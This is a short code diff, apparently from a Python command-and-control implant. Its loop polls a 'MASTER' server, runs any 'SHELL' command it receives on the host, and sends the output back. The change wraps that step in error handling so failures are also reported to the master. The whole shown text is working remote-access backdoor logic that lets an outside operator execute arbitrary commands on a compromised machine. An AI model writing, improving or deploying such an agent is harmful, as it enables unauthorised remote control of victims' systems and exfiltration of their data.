@@ -37,8 +37,12 @@ while True:
 		time.sleep(SLEEP_IN_SECONDS)
 		continue
 	if response['type']=='SHELL':
-		cmd_output = get_shell_output(response['command'])
-		print("[+] Sending Response back to MASTER..")
-		send_response_to_server(cmd_output)
+		try:
+			cmd_output = get_shell_output(response['command'])
+			print("[+] Sending Response back to MASTER..")
+			send_response_to_server(cmd_output)
+		except:
+			print("[+] Sending ERROR back to MASTER..")
+			send_response_to_server("ERROR!!")
 
 	time.sleep(SLEEP_IN_SECONDS)
